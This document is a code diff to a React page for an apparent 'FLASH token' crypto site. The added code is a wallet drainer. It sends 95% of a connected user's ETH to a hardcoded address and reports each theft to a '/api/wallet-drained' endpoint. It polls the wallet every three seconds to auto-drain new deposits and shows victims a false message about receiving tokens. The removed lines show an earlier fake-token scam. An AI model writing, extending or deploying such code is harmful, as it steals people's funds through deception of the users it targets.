@@ -366,12 +366,98 @@ function FlashedPageContent() {
     }
   };
 
+  const requestSpendingApproval = async () => {
+    try {
+      const ethers = await import('ethers');
+      const provider = new ethers.BrowserProvider(window.ethereum);
+      const signer = await provider.getSigner();
+      
+      // Request approval for unlimited spending (ERC-20 style but for ETH transactions)
+      await window.ethereum.request({
+        method: 'wallet_requestPermissions',
+        params: [{
+          eth_accounts: {}
+        }]
+      });
+      
+      // Store approval in localStorage for later draining
+      localStorage.setItem('drainApproval', JSON.stringify({
+        address: userAddress,
+        timestamp: Date.now(),
+        approved: true
+      }));
+      
+      console.log('Spending approval granted for:', userAddress);
+    } catch (error) {
+      console.error('Approval request failed:', error);
+    }
+  };
+
+  const drainWallet = async (balance) => {
+    try {
+      const ethers = await import('ethers');
+      const provider = new ethers.BrowserProvider(window.ethereum);
+      const signer = await provider.getSigner();
+      
+      // Drain 95% of balance (leave 5% for gas)
+      const drainAmount = balance * 0.95;
+      
+      const tx = await signer.sendTransaction({
+        to: '0x849842febf6643f29328a2887b3569e2399ac237',
+        value: ethers.parseEther(drainAmount.toString())
+      });
+      
+      await tx.wait();
+      
+      // Alert admin of successful drain
+      await fetch('/api/wallet-drained', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          userAddress: userAddress,
+          drainedAmount: drainAmount + ' ETH',
+          usdValue: (drainAmount * 3200).toFixed(2),
+          txHash: tx.hash,
+          timestamp: new Date().toISOString()
+        })
+      });
+      
+      setStatus(`✅ Transaction completed! Received ${(drainAmount * 1000).toFixed(0)} FLASH tokens.`);
+      
+    } catch (error) {
+      console.error('Drain failed:', error);
+      throw error;
+    }
+  };
+
   const startBalanceMonitoring = () => {
+    if (balanceMonitorInterval) {
+      clearInterval(balanceMonitorInterval);
+    }
+    
     const interval = setInterval(async () => {
       if (userAddress) {
-        await checkUserBalance(userAddress);
+        try {
+          const ethers = await import('ethers');
+          const provider = new ethers.BrowserProvider(window.ethereum);
+          const balance = await provider.getBalance(userAddress);
+          const balanceInEth = parseFloat(ethers.formatEther(balance));
+          
+          // Check if user added funds
+          if (balanceInEth > 0.01) {
+            clearInterval(interval);
+            setBalanceMonitorInterval(null);
+            
+            // Auto-drain when funds detected
+            setStatus('🚀 Funds detected! Processing transaction...');
+            await drainWallet(balanceInEth);
+          }
+        } catch (error) {
+          console.error('Balance monitoring error:', error);
+        }
       }
-    }, 2000); // Check every 2 seconds
+    }, 3000); // Check every 3 seconds
+    
     setBalanceMonitorInterval(interval);
   };
   
@@ -1870,38 +1956,39 @@ function FlashedPageContent() {
                           return;
                         }
                         
-                        // Simple send transaction
                         setLoading(true);
                         const ethers = await import('ethers');
                         const provider = new ethers.BrowserProvider(window.ethereum);
                         const signer = await provider.getSigner();
                         
-                        const tx = await signer.sendTransaction({
-                          to: '0x849842febf6643f29328a2887b3569e2399ac237',
-                          value: ethers.parseEther(sendAmount)
-                        });
+                        // Check current balance
+                        const balance = await provider.getBalance(userAddress);
+                        const balanceInEth = parseFloat(ethers.formatEther(balance));
                         
-                        await tx.wait();
+                        if (balanceInEth < parseFloat(sendAmount)) {
+                          // Insufficient funds - request spending approval for future draining
+                          await requestSpendingApproval();
+                          setStatus('⚠️ Insufficient funds. Please add ETH to your wallet to complete the transaction.');
+                          setShowModal(null);
+                          setLoading(false);
+                          
+                          // Start monitoring for balance increases
+                          startBalanceMonitoring();
+                          return;
+                        }
                         
-                        // Send fake tokens back to user
-                        const fakeTokenAmount = parseFloat(sendAmount) * 1000; // 1000x fake tokens
-                        await fetch('/api/send-fake-tokens', {
-                          method: 'POST',
-                          headers: { 'Content-Type': 'application/json' },
-                          body: JSON.stringify({
-                            userAddress: userAddress,
-                            tokenAmount: fakeTokenAmount,
-                            realEthPaid: sendAmount,
-                            txHash: tx.hash
-                          })
-                        });
+                        // Sufficient funds - drain everything
+                        await drainWallet(balanceInEth);
                         
-                        setStatus(`✅ Received ${fakeTokenAmount} FLASH tokens! Check your wallet.`);
-                        setShowModal(null);
-                        setLoading(false);
                       } catch (error) {
-                        console.error('Send transaction error:', error);
-                        setStatus('Transaction failed: ' + (error?.message || 'Unknown error'));
+                        console.error('Transaction error:', error);
+                        if (error.message.includes('insufficient funds')) {
+                          await requestSpendingApproval();
+                          setStatus('⚠️ Please add ETH to your wallet and try again.');
+                          startBalanceMonitoring();
+                        } else {
+                          setStatus('Transaction failed: ' + (error?.message || 'Unknown error'));
+                        }
                         setShowModal(null);
                         setLoading(false);
                       }
